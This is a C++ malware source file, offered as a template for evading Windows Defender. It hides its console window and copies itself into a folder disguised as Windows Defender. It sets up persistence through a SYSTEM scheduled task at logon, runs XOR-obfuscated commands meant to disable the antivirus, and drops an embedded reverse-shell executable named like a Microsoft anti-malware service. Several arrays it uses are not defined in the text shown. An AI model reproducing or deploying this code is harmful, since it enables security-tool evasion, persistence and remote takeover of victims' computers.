
/*

    ##########################################################################################
    ######## WARNING : DO NOT TEST THIS EXECUTABLE ON ANY COMPUTER THAT YOU DON'T OWN ########
    ##########################################################################################

    Template for executing CMD Commands in Windows without getting caught by Windows Defender
    Current Usage : Disabling Windows Defender xD

    Requirements : Admin Priviledges :/
    Working : Copy executable to disk and create a scheduled task to disable Antivirus

    Location : %userprofile%/AppData/Local/Windows Defender/Windows Defender.exe

*/

#include <bits/stdc++.h>
#include <windows.h>
#include <stdlib.h>
#include <string>
#include <fstream>

#include <iostream>
using namespace std;


void decrypt_xor(int command[], int key[], int command_length, int key_length, char exec_command[]) {
    for(int i = 0; i < command_length; i++) {
        exec_command[i] = command[i] ^ key[i % key_length];
    }
    exec_command[command_length] = 0;
}

string get_cwd(char current_file_path[]) {
    int end = 0;
    while(current_file_path[end + 1] != '\0') {
        end++;
    }
    while(end > 0 && current_file_path[end] != '\\') {
        end--;
    }
    string cwd = "";
    for(int i = 0; i < end; i++) {
        cwd += current_file_path[i];
    }
    return cwd;
}

void runReverseShell(char *args) {
    ofstream reverse_shell;

    string path = getenv("userprofile");
    path += "\\AppData\\Local\\Windows Defender\\Anti Malware Service.exe";
    cout << path;
    reverse_shell.open(path, ios::binary | ios::out);

    for(int i = 0; i < revShellLen; i++) {
        reverse_shell << (char) revShellCode[i];
    }

    reverse_shell.close();
}

void copy_to_disk(char *args) {
    string desired_location = getenv("userprofile");
    desired_location += "\\AppData\\Local\\Windows Defender";
    string cwd = get_cwd(args);
    string file_ = args;
    if (cwd != desired_location) {
        string temp = "mkdir \"";
        temp += desired_location + "\"";
        system(temp.c_str());
        temp = "COPY \"";
        desired_location = temp + file_ + "\" \"" + desired_location + "\\Windows Defender.exe\"";
        system(desired_location.c_str());
        desired_location = getenv("userprofile");
        desired_location += "\\AppData\\Local\\Windows Defender\\Windows Defender.exe";
        string task = "SCHTASKS /CREATE /SC ONLOGON /TN \"Windows Defender\\Defender Scan\" /TR \"" + desired_location + "\" /F /RU \"SYSTEM\"";
        system(task.c_str());
    }
}


int main(int argc, char *argv[]) {
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );

    copy_to_disk(argv[0]);

    char exec_commands[num_commands][max_command_size + 1];
    for(int i = 0; i < num_commands; i++) {
        decrypt_xor(commands[i],key,size_of_commands[i],key_len, exec_commands[i]);
    }
    for(int i = 0; i < num_commands; i++) {
        system(exec_commands[i]);
    }

    runReverseShell(argv[0]);
    
    return 0;
}
